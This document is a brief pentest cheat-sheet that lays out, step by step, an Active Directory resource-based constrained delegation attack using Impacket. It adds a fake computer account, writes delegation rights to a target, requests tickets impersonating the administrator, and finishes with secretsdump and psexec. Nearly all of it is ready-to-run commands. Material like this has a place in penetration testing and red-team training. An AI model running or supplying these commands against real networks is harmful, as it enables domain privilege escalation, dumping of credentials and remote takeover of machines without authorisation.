If we have a krb5cc file but cant use psexec or wmiexec then we can use that ticket to request a TGT if we have genericwrite over a machine to get the administrator ccache file.

> After we have the ticket exported and verified with klist, we start with adding a new computer to the domain:

```
python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-host <dchostname>.<domain> -k -no-pass <domain>/<krb5_user>
```

> Now we allow delegation from our computer to our target machine we have genericwrite over:

```
python3 /usr/share/doc/python3-impacket/examples/rbcd.py -delegate-from 'FAKE01$' -delegate-to '<target_host>$' -dc-ip <dc_ip> -action 'write' -k -no-pass <domain>/<krb5_user>
```

> Now we obtain a hash for our new machine account password and then use it to request a TGT:

```
pypykatz crypto nt 'FakePass123!'
```

```
getTGT.py -dc-ip <dc_ip> '<domain>/FAKE01$' -hashes ':<machine_hash>'
```

> Now we will obtain a ccache file for our added machine which we will export then use to request the administrator ccache:

```
export KRB5CCNAME=FAKE01$.ccache
```

```
getST.py -spn 'host/<target_hostname>.<domain>' -impersonate 'administrator' -dc-ip <dc_ip> -k -no-pass '<domain>/FAKE01$'
```

```
export KRB5CCNAME=administrator.ccache
```

> Now we can psexec into the target machine and also do secretsdump:

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -k <target_hostname>.<domain> -no-pass
```

```
python3 /usr/share/doc/python3-impacket/examples/psexec.py -k <target_hostname>.<domain> -no-pass
```
